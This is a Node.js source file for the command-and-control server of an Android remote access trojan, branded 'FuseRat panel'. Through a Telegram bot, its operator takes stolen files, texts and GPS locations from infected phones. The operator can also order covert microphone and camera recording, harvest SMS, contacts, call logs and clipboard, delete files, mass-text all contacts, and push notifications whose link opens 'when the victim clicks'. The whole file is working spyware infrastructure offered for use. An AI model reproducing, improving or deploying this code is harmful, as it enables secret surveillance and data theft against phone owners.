const express = require("express");
const webSocket = require("ws");
const http = require("http");
const telegramBot = require("node-telegram-bot-api");
const uuid4 = require("uuid");
const multer = require("multer");
const bodyParser = require("body-parser");
const axios = require("axios");
require("dotenv").config();

// ---------- ERROR LOGGING FUNCTION ----------
function logError(err, location) {
    console.error(`[ERROR] Location: ${location}`);
    console.error(`[ERROR] Message: ${err.message}`);
    if (err.stack) console.error(`[ERROR] Stack: ${err.stack}`);
}

// ---------- ENV CHECKS ----------
const token = process.env.TOKEN;
const id = process.env.ID;
if (!token || !id) {
    console.error("[FATAL] TOKEN or ID missing in .env file. Exiting.");
    process.exit(1);
}

// ---------- EXPRESS SETUP ----------
const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });
const appBot = new telegramBot(token, { polling: true });
const appClients = new Map();
const upload = multer();
app.use(bodyParser.json());

// ---------- GLOBAL STATE ----------
let currentUuid = '';
let currentNumber = '';
let currentTitle = '';
let currentPath = ''; // optional

// ---------- ROOT ----------
app.get("/", (_req, res) => {
    res.send("<h1 align=\"center\">𝙎𝙚𝙧𝙫𝙚𝙧 𝙪𝙥𝙡𝙤𝙖𝙙𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮</h1>");
});

// ---------- UPLOAD FILE ----------
app.post("/uploadFile", upload.single("file"), (req, res) => {
    try {
        if (!req.file) throw new Error("No file received");
        const originalName = req.file.originalname || "unknown_file";
        appBot.sendDocument(id, req.file.buffer, {
            caption: "°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>" + (req.headers.model || "Unknown") + "</b> 𝙙𝙚𝙫𝙞𝙘𝙚",
            parse_mode: "HTML"
        }, {
            filename: originalName,
            contentType: "application/txt"
        }).catch(err => logError(err, "app.post(/uploadFile) - sendDocument"));
        res.send('');
    } catch (err) {
        logError(err, "app.post(/uploadFile)");
        res.status(500).send('');
    }
});

// ---------- UPLOAD TEXT ----------
app.post("/uploadText", (req, res) => {
    try {
        const model = req.headers.model || "Unknown";
        const text = req.body.text || "(empty)";
        appBot.sendMessage(id, "°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>" + model + "</b> 𝙙𝙚𝙫𝙞𝙘𝙚\n\n" + text, {
            parse_mode: "HTML"
        }).catch(err => logError(err, "app.post(/uploadText)"));
        res.send('');
    } catch (err) {
        logError(err, "app.post(/uploadText)");
        res.status(500).send('');
    }
});

// ---------- UPLOAD LOCATION ----------
app.post("/uploadLocation", (req, res) => {
    try {
        const lat = req.body.lat;
        const lon = req.body.lon;
        if (lat == null || lon == null) throw new Error("Missing lat/lon");
        appBot.sendLocation(id, lat, lon).catch(err => logError(err, "app.post(/uploadLocation) - sendLocation"));
        appBot.sendMessage(id, "°• 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣 𝙛𝙧𝙤𝙢 <b>" + (req.headers.model || "Unknown") + "</b> 𝙙𝙚𝙫𝙞𝙘𝙚", {
            parse_mode: "HTML"
        }).catch(err => logError(err, "app.post(/uploadLocation) - sendMessage"));
        res.send('');
    } catch (err) {
        logError(err, "app.post(/uploadLocation)");
        res.status(500).send('');
    }
});

// ---------- WEBSOCKET CONNECTION ----------
appSocket.on("connection", (ws, req) => {
    try {
        const uuid = uuid4.v4();
        const model = req.headers.model || "Unknown";
        const battery = req.headers.battery || "Unknown";
        const version = req.headers.version || "Unknown";
        const brightness = req.headers.brightness || "Unknown";
        const provider = req.headers.provider || "Unknown";

        ws.uuid = uuid;
        appClients.set(uuid, { model, battery, version, brightness, provider });

        appBot.sendMessage(id, 
            "°• NEW DEVICE IS CONNECTED, DEVELOPED BY @MOGATEAM & @shivayadavv\n\n" +
            "• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>" + model + "</b>\n" +
            "• ʙᴀᴛᴛᴇʀʏ : <b>" + battery + "</b>\n" +
            "• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>" + version + "</b>\n" +
            "• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>" + brightness + "</b>\n" +
            "• ᴘʀᴏᴠɪᴅᴇʀ : <b>" + provider + "</b>", 
            { parse_mode: "HTML" }
        ).catch(err => logError(err, "appSocket.on(connection) - new device"));

        ws.on("close", () => {
            try {
                appBot.sendMessage(id, 
                    "°• 𝘿𝙚𝙫𝙞𝙘𝙚 𝙙𝙞𝙨𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙, DEVELOPED BY @MOGATEAM & @shivayadavv\n\n" +
                    "• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>" + model + "</b>\n" +
                    "• ʙᴀᴛᴛᴇʀʏ : <b>" + battery + "</b>\n" +
                    "• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>" + version + "</b>\n" +
                    "• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>" + brightness + "</b>\n" +
                    "• ᴘʀᴏᴠɪᴅᴇʀ : <b>" + provider + "</b>", 
                    { parse_mode: "HTML" }
                ).catch(err => logError(err, "appSocket.on(close)"));
                appClients.delete(ws.uuid);
            } catch (err) {
                logError(err, "appSocket.on(close)");
            }
        });

        ws.on("error", (err) => {
            logError(err, "appSocket.on(error)");
        });

    } catch (err) {
        logError(err, "appSocket.on(connection)");
    }
});

// ---------- MESSAGE HANDLER ----------
appBot.on("message", (msg) => {
    try {
        const chatId = msg.chat.id;
        // Only respond to owner chat
        if (String(chatId) !== String(id)) {
            appBot.sendMessage(chatId, "°• 𝙋𝙚𝙧𝙢𝙞𝙨𝙨𝙞𝙤𝙣 𝙙𝙚𝙣𝙞𝙚𝙙").catch(() => {});
            return;
        }

        // Prevent bot from replying to itself
        if (msg.from && msg.from.is_bot) return;

        // Handle replies
        if (msg.reply_to_message) {
            const replyText = msg.reply_to_message.text || "";

            // ----- SMS number -----
            if (replyText.includes("°• 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙝𝙚 𝙣𝙪𝙢𝙗𝙚𝙧 𝙩𝙤 𝙬𝙝𝙞𝙘𝙝 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝙎𝙈𝙎")) {
                currentNumber = msg.text;
                appBot.sendMessage(id, 
                    "°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙩𝙝𝙞𝙨 𝙣𝙪𝙢𝙗𝙚𝙧\n\n• ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ", 
                    { reply_markup: { force_reply: true } }
                ).catch(err => logError(err, "appBot.on(message) - SMS number reply"));
                return;
            }

            // ----- SMS message -----
            if (replyText.includes("°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙩𝙝𝙞𝙨 𝙣𝙪𝙢𝙗𝙚𝙧")) {
                sendToClient("send_message:" + currentNumber + "/" + msg.text);
                currentNumber = '';
                // DO NOT reset currentUuid here
                sendProcessingReply();
                return;
            }

            // ----- Send message to all contacts -----
            if (replyText.includes("°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨")) {
                sendToClient("send_message_to_all:" + msg.text);
                // DO NOT reset currentUuid here
                sendProcessingReply();
                return;
            }

            // ----- FILE EXPLORE (NEW) -----
            if (replyText.includes("°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙩𝙤 𝙚𝙭𝙥𝙡𝙤𝙧𝙚")) {
                if (!currentUuid) {
                    appBot.sendMessage(id, "❌ Error: No device selected. Please select a device first.");
                    return;
                }
                const path = msg.text.trim();
                if (!path || path.length < 2) {
                    appBot.sendMessage(id, "❌ Invalid path. Please enter a valid path like /sdcard");
                    return;
                }
                sendToClient("explore:" + path);
                // DO NOT reset currentUuid here
                sendProcessingReply();
                return;
            }

            // ----- FILE DOWNLOAD (NEW) -----
            if (replyText.includes("°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙩𝙤 𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙")) {
                if (!currentUuid) {
                    appBot.sendMessage(id, "❌ Error: No device selected. Please select a device first.");
                    return;
                }
                const path = msg.text.trim();
                if (!path || path.length < 2) {
                    appBot.sendMessage(id, "❌ Invalid file path. Please enter a valid full path.");
                    return;
                }
                sendToClient("download:" + path);
                // DO NOT reset currentUuid here
                sendProcessingReply();
                return;
            }

            // ----- OLD DOWNLOAD (legacy) -----
            if (replyText.includes("°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙")) {
                sendToClient("file:" + msg.text);
                // DO NOT reset currentUuid here
                sendProcessingReply();
                return;
            }

            // ----- DELETE FILE -----
            if (replyText.includes("°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙚𝙡𝙚𝙩𝙚")) {
                sendToClient("delete_file:" + msg.text);
                // DO NOT reset currentUuid here
                sendProcessingReply();
                return;
            }

            // ----- MICROPHONE -----
            if (replyText.includes("°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙")) {
                sendToClient("microphone:" + msg.text);
                // DO NOT reset currentUuid here
                sendProcessingReply();
                return;
            }

            // ----- MAIN CAMERA -----
            if (replyText.includes("°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙖𝙞𝙣 𝙘𝙖𝙢𝙚𝙧𝙖 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙")) {
                sendToClient("rec_camera_main:" + msg.text);
                // DO NOT reset currentUuid here
                sendProcessingReply();
                return;
            }

            // ----- SELFIE CAMERA -----
            if (replyText.includes("°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙨𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙")) {
                sendToClient("rec_camera_selfie:" + msg.text);
                // DO NOT reset currentUuid here
                sendProcessingReply();
                return;
            }

            // ----- TOAST -----
            if (replyText.includes("°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙝𝙖𝙩 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙤𝙣 𝙩𝙝𝙚 𝙩𝙖𝙧𝙜𝙚𝙩 𝙙𝙚𝙫𝙞𝙘𝙚")) {
                sendToClient("toast:" + msg.text);
                // DO NOT reset currentUuid here
                sendProcessingReply();
                return;
            }

            // ----- NOTIFICATION TITLE -----
            if (replyText.includes("°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙖𝙨 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣")) {
                currentTitle = msg.text;
                appBot.sendMessage(id, 
                    "°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙗𝙚 𝙤𝙥𝙚𝙣𝙚𝙙 𝙗𝙮 𝙩𝙝𝙚 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣\n\n• ᴡʜᴇɴ ᴛʜᴇ ᴠɪᴄᴛɪᴍ ᴄʟɪᴄᴋꜱ ᴏɴ ᴛʜᴇ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ, ᴛʜᴇ ʟɪɴᴋ ʏᴏᴜ ᴀʀᴇ ᴇɴᴛᴇʀɪɴɢ ᴡɪʟʟ ʙᴇ ᴏᴘᴇɴᴇᴅ", 
                    { reply_markup: { force_reply: true } }
                ).catch(err => logError(err, "appBot.on(message) - notification title"));
                return;
            }

            // ----- NOTIFICATION LINK -----
            if (replyText.includes("°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙗𝙚 𝙤𝙥𝙚𝙣𝙚𝙙 𝙗𝙮 𝙩𝙝𝙚 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣")) {
                sendToClient("show_notification:" + currentTitle + "/" + msg.text);
                currentTitle = '';
                // DO NOT reset currentUuid here
                sendProcessingReply();
                return;
            }

            // ----- PLAY AUDIO -----
            if (replyText.includes("°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙖𝙪𝙙𝙞𝙤 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙥𝙡𝙖𝙮")) {
                sendToClient("play_audio:" + msg.text);
                // DO NOT reset currentUuid here
                sendProcessingReply();
                return;
            }
        }

        // ----- NON-REPLY COMMANDS -----
        if (msg.text === "/start") {
            appBot.sendMessage(id, 
                "°• °• 𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙩𝙤  Fuse𝙍𝙖𝙩 𝙥𝙖𝙣𝙚𝙡\n\n" +
                "• ɪꜰ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ, ᴡᴀɪᴛ ꜰᴏʀ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ\n\n" +
                "• ᴡʜᴇɴ ʏᴏᴜ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ ᴍᴇꜱꜱᴀɢᴇ, ɪᴛ ᴍᴇᴀɴꜱ ᴛʜᴀᴛ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ɪꜱ ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴀɴᴅ ʀᴇᴀᴅʏ ᴛᴏ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ\n\n" +
                "• ᴄʟɪᴄᴋ ᴏɴ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ ʙᴜᴛᴛᴏɴ ᴀɴᴅ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴅᴇᴠɪᴄᴇ ᴛʜᴇɴ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴄᴏᴍᴍᴀɴᴅ ᴀᴍᴏɴɢ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅꜱ\n\n" +
                "• ɪꜰ ʏᴏᴜ ɢᴇᴛ ꜱᴛᴜᴄᴋ ꜱᴏᴍᴇᴡʜᴇʀᴇ ɪɴ ᴛʜᴇ ʙᴏᴛ, ꜱᴇɴᴅ /start ᴄᴏᴍᴍᴀɴᴅ", 
                { 
                    parse_mode: "HTML",
                    reply_markup: { 
                        keyboard: [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                        resize_keyboard: true 
                    }
                }
            ).catch(err => logError(err, "appBot.on(message) - /start"));
            return;
        }

        if (msg.text === "𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨") {
            if (appClients.size === 0) {
                appBot.sendMessage(id, "°• 𝙉𝙤 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙣𝙜 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 𝙖𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚\n\n• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ").catch(() => {});
            } else {
                let list = "°• 𝙇𝙞𝙨𝙩 𝙤𝙛 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 :\n\n";
                appClients.forEach((val, key) => {
                    list += "• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>" + val.model + "</b>\n" +
                            "• ʙᴀᴛᴛᴇʀʏ : <b>" + val.battery + "</b>\n" +
                            "• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>" + val.version + "</b>\n" +
                            "• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>" + val.brightness + "</b>\n" +
                            "• ᴘʀᴏᴠɪᴅᴇʀ : <b>" + val.provider + "</b>\n\n";
                });
                appBot.sendMessage(id, list, { parse_mode: "HTML" }).catch(err => logError(err, "appBot.on(message) - connected devices"));
            }
            return;
        }

        if (msg.text === "𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙") {
            if (appClients.size === 0) {
                appBot.sendMessage(id, "°• 𝙉𝙤 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙣𝙜 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 𝙖𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚\n\n• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ").catch(() => {});
            } else {
                const buttons = [];
                appClients.forEach((val, key) => {
                    buttons.push([{ text: val.model, callback_data: "device:" + key }]);
                });
                appBot.sendMessage(id, "°• 𝙎𝙚𝙡𝙚𝙘𝙩 𝙙𝙚𝙫𝙞𝙘𝙚 𝙩𝙤 𝙚𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙚𝙣𝙙", {
                    reply_markup: { inline_keyboard: buttons }
                }).catch(err => logError(err, "appBot.on(message) - execute command"));
            }
            return;
        }

    } catch (err) {
        logError(err, "appBot.on(message) - top level");
    }
});

// ---------- HELPER: Send to client with UUID ----------
function sendToClient(payload) {
    if (!currentUuid) {
        appBot.sendMessage(id, "❌ No device selected. Please select a device first using 'Execute command'.");
        return;
    }
    let found = false;
    appSocket.clients.forEach((ws) => {
        if (ws.uuid === currentUuid && ws.readyState === webSocket.OPEN) {
            ws.send(payload);
            found = true;
        }
    });
    if (!found) {
        appBot.sendMessage(id, "❌ Device disconnected or not ready. Please reconnect the device.");
        currentUuid = ''; // reset only if device is gone
    }
}

// ---------- HELPER: Send "Processing" reply ----------
function sendProcessingReply() {
    appBot.sendMessage(id, 
        "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n" +
        "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv", 
        {
            parse_mode: "HTML",
            reply_markup: {
                keyboard: [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                resize_keyboard: true
            }
        }
    ).catch(err => logError(err, "sendProcessingReply"));
}

// ---------- CALLBACK QUERY HANDLER ----------
appBot.on("callback_query", (query) => {
    try {
        const msg = query.message;
        const data = query.data;
        if (!data) return;

        const parts = data.split(":");
        const action = parts[0];
        const uuid = parts[1] || "";

        // Device selection
        if (action === "device") {
            if (!appClients.has(uuid)) {
                appBot.answerCallbackQuery(query.id, { text: "Device not found" }).catch(() => {});
                return;
            }
            currentUuid = uuid;
            const device = appClients.get(uuid);
            appBot.editMessageText(
                "°• 𝙎𝙚𝙡𝙚𝙘𝙩 𝙘𝙤𝙢𝙢𝙚𝙣𝙙 𝙛𝙤𝙧 𝙙𝙚𝙫𝙞𝙘𝙚 : <b>" + device.model + "</b>",
                {
                    chat_id: id,
                    message_id: msg.message_id,
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: "𝘼𝙥𝙥𝙨", callback_data: "apps:" + uuid }, { text: "𝘿𝙚𝙫𝙞𝙘𝙚 𝙞𝙣𝙛𝙤", callback_data: "device_info:" + uuid }],
                            [{ text: "𝙂𝙚𝙩 𝙛𝙞𝙡𝙚", callback_data: "file:" + uuid }, { text: "𝘿𝙚𝙡𝙚𝙩𝙚 𝙛𝙞𝙡𝙚", callback_data: "delete_file:" + uuid }],
                            [{ text: "𝘾𝙡𝙞𝙥𝙗𝙤𝙖𝙧𝙙", callback_data: "clipboard:" + uuid }, { text: "𝙈𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚", callback_data: "microphone:" + uuid }],
                            [{ text: "𝙈𝙖𝙞𝙣 𝙘𝙖𝙢𝙚𝙧𝙖", callback_data: "camera_main:" + uuid }, { text: "𝙎𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖", callback_data: "camera_selfie:" + uuid }],
                            [{ text: "𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣", callback_data: "location:" + uuid }, { text: "𝙏𝙤𝙖𝙨𝙩", callback_data: "toast:" + uuid }],
                            [{ text: "𝘾𝙖𝙡𝙡𝙨", callback_data: "calls:" + uuid }, { text: "𝘾𝙤𝙣𝙩𝙖𝙘𝙩𝙨", callback_data: "contacts:" + uuid }],
                            [{ text: "𝙑𝙞𝙗𝙧𝙖𝙩𝙚", callback_data: "vibrate:" + uuid }, { text: "𝙎𝙝𝙤𝙬 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣", callback_data: "show_notification:" + uuid }],
                            [{ text: "𝙈𝙚𝙨𝙨𝙖𝙜𝙚𝙨", callback_data: "messages:" + uuid }, { text: "𝙎𝙚𝙣𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚", callback_data: "send_message:" + uuid }],
                            [{ text: "𝙋𝙡𝙖𝙮 𝙖𝙪𝙙𝙞𝙤", callback_data: "play_audio:" + uuid }, { text: "𝙎𝙩𝙤𝙥 𝙖𝙪𝙙𝙞𝙤", callback_data: "stop_audio:" + uuid }],
                            [{ text: "𝙎𝙚𝙣𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨", callback_data: "send_message_to_all:" + uuid }],
                            // NEW EXPLORE / DOWNLOAD BUTTONS
                            [{ text: "𝙁𝙞𝙡𝙚 𝙀𝙭𝙥𝙡𝙤𝙧𝙚", callback_data: "explore:" + uuid }, { text: "𝘿𝙤𝙬𝙣𝙡𝙤𝙖𝙙", callback_data: "download_file:" + uuid }]
                        ]
                    },
                    parse_mode: "HTML"
                }
            ).catch(err => logError(err, "appBot.on(callback_query) - device edit"));
            appBot.answerCallbackQuery(query.id).catch(() => {});
            return;
        }

        // All other commands: forward to device
        if (action) {
            // Set currentUuid for the reply
            currentUuid = uuid;
            const clientExists = appClients.has(uuid);
            if (!clientExists) {
                appBot.answerCallbackQuery(query.id, { text: "Device not connected" }).catch(() => {});
                return;
            }

            // Handle special actions that need immediate reply
            if (action === "explore") {
                appBot.deleteMessage(id, msg.message_id).catch(() => {});
                appBot.sendMessage(id, 
                    "°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙩𝙤 𝙚𝙭𝙥𝙡𝙤𝙧𝙚\n\n• ʏᴏᴜ ᴄᴀɴ ᴇɴᴛᴇʀ <b>/sdcard</b> ᴏʀ <b>/data</b>", 
                    { reply_markup: { force_reply: true }, parse_mode: "HTML" }
                ).catch(err => logError(err, "appBot.on(callback_query) - explore prompt"));
                appBot.answerCallbackQuery(query.id).catch(() => {});
                return;
            }

            if (action === "download_file") {
                appBot.deleteMessage(id, msg.message_id).catch(() => {});
                appBot.sendMessage(id, 
                    "°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙩𝙤 𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙\n\n• ᴇxᴀᴍᴘʟᴇ: <b>/sdcard/DCIM/image.jpg</b>", 
                    { reply_markup: { force_reply: true }, parse_mode: "HTML" }
                ).catch(err => logError(err, "appBot.on(callback_query) - download prompt"));
                appBot.answerCallbackQuery(query.id).catch(() => {});
                return;
            }

            // For other actions, just forward a command (the APK will handle it)
            // But we need to send the command directly without reply prompt
            if (action === "apps" || action === "device_info" || action === "file" || action === "delete_file" ||
                action === "clipboard" || action === "microphone" || action === "camera_main" || action === "camera_selfie" ||
                action === "location" || action === "toast" || action === "calls" || action === "contacts" ||
                action === "vibrate" || action === "show_notification" || action === "messages" || action === "send_message" ||
                action === "send_message_to_all" || action === "play_audio" || action === "stop_audio") {
                
                // Delete the menu message
                appBot.deleteMessage(id, msg.message_id).catch(() => {});
                
                // Send command directly to APK
                sendToClient(action + ":");
                
                appBot.answerCallbackQuery(query.id).catch(() => {});
                return;
            }
        }

    } catch (err) {
        logError(err, "appBot.on(callback_query) - top level");
        appBot.answerCallbackQuery(query.id, { text: "Error occurred" }).catch(() => {});
    }
});

// ---------- KEEP ALIVE / PING ----------
setInterval(() => {
    try {
        appSocket.clients.forEach((ws) => {
            if (ws.readyState === webSocket.OPEN) {
                ws.send("ping");
            }
        });
        // Keep server alive with external ping
        axios.get("https://www.google.com").catch(() => {});
    } catch (err) {
        // Silently ignore ping errors
    }
}, 5000);

// ---------- START SERVER ----------
const PORT = process.env.PORT || 8999;
appServer.listen(PORT, () => {
    console.log(`[SERVER] Running on port ${PORT}`);
    console.log("[SERVER] Error logs will show full stack trace with location.");
});

// ---------- BOT POLLING ERROR RECOVERY ----------
